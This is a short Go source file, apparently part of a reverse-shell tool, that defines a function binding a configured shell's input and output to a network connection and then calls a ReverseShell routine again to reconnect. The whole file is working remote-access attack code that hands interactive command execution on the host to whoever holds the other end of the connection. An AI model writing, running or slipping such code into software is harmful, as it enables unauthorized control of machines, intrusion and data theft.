// +build !windows
package main

import (
	"net"
	"os/exec"
)

func Shell(conn net.Conn, config Config){
	cmd := exec.Command(config.Shell)
	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
	cmd.Run()
	conn.Close()
	ReverseShell(config)
}